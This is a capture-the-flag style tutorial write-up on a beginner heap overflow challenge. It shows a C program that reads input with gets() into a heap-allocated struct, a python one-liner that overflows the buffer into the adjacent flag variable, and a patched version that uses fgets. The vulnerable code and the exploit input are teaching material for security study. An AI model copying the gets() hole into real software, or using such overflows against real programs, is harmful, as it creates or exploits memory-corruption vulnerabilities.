Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

struct struct0 
{
  char buf0[100];
  int var0;
};

int main()
{
  struct struct0 *p0; 

  p0 = malloc(sizeof(struct struct0));
  printf("Insert text here...\n");
  p0->var0 = 0;
  gets(p0->buf0);
  
  if (p0->var0)
  {
    printf("Well aren't you the well rounded researcher. Level Cleared\n");
  }
}
```

So looking at this code, we see a vulnerabillity that is similar to pretty much every buf_ovf challenge. It uses a call to gets() to input data into p0->buf0. However unlike the buf_ovf challenges, we are dealing with the heap instad of typical stack memory. You can see that in the code, a structutre "struct0" is defined, and in main p0 is a structure that is allocated memory in the heap to hold an instance of the struct0 structure. However exploiting this will be similar to that of the buf_ovf challengeds (this time).

We see that in order to clear the level, we have to set p0->var0 equal to anything other than 0. We see that we have unlimited input to p0->buf0, which is stored right next to p0->var0. We should be able to write 101 characters to p0->buf0, and it will overflow into p0->var0. Let's try it (btw the reason why I can use 0, is because the ascii character 0 isn't actually interpreted as 0 in hex and decimal forms).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h0$ python -c 'print "0"*101' | ./h0 
Insert text here...
Well aren't you the well rounded researcher. Level Cleared
```

Just like that, we pwned the binary. Now let's patch it just like a buf_ovf challenge.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h0$ cat h0_secure.c
#include <stdlib.h>
#include <stdio.h>

struct struct0 
{
  char buf0[100];
  int var0;
};

int main()
{
  struct struct0 *p0; 

  p0 = malloc(sizeof(struct struct0));
  printf("Insert text here...\n");
  p0->var0 = 0;
  fgets(p0->buf0, sizeof(p0->buf0), stdin);
  
  if (p0->var0)
  {
    printf("Well aren't you the well rounded researcher. Level Cleared\n");
  }
}
guyinatuxedo@tux:/Hackery/escape/heap_exp/h0$ python -c 'print "0"*101' | ./h0_secure 
Insert text here...
guyinatuxedo@tux:/Hackery/escape/heap_exp/h0$ 
```

